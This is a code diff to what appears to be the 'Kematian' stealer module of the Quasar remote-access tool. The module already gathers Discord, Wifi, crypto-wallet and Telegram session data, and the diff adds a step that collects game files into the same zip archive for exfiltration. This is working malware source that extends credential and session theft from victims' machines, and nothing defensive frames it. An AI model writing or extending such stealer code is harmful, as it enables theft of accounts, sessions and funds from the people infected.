@@ -3,6 +3,7 @@ using Quasar.Client.Kematian.Discord;
 using Quasar.Client.Kematian.Wifi;
 using Quasar.Client.Kematian.Wallets;
 using Quasar.Client.Kematian.Telegram;
+using Quasar.Client.Kematian.Games;
 using System;
 using System.Diagnostics;
 using System.Collections.Generic;
@@ -68,6 +69,23 @@ namespace Quasar.Client.Kematian
                     catch (Exception ex)
                     {
                         Debug.WriteLine($"Error processing Telegram session files: {ex.Message}");
+                    }
+
+                    try
+                    {
+                        var gameFiles = GamesRetriever.GetGameFiles();
+                        foreach (var file in gameFiles)
+                        {
+                            var zipEntry = archive.CreateEntry(file.Key);
+                            using (var entryStream = new BufferedStream(zipEntry.Open()))
+                            {
+                                entryStream.Write(file.Value, 0, file.Value.Length);
+                            }
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error processing game files: {ex.Message}");
                     }
                 }
                 data = memoryStream.ToArray();
